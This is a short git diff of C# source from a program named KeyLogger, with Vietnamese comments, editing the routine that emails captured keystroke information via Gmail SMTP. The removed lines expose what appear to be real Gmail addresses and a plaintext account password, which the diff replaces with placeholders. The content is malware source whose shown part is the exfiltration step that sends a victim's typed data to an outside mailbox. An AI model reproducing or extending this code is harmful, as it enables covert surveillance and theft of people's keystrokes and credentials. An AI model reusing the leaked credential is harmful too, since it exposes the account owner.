@@ -277,8 +277,8 @@ namespace KeyLogger
                 MailMessage mail = new MailMessage();
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
 
-                mail.From = new MailAddress("minhthuanpttt@gmail.com");         //Mail sẽ gửi thông tin đi
-                mail.To.Add("transfermirrorofneymar@gmail.com");                //Mail nhận đc thông tin
+                mail.From = new MailAddress("email@gmail.com");         //Mail sẽ gửi thông tin đi
+                mail.To.Add("email@gmail.com");                //Mail nhận đc thông tin
                 mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                 mail.Body = "Thông tin: \n";
 
@@ -307,7 +307,7 @@ namespace KeyLogger
 
                 SmtpServer.Port = 587;
                 //Điền thông tin mail sẽ gửi thông tin
-                SmtpServer.Credentials = new System.Net.NetworkCredential("minhthuanpttt@gmail.com", "Yourluckysmile2004");
+                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "password");
                 SmtpServer.EnableSsl = true;
 
                 SmtpServer.Send(mail);
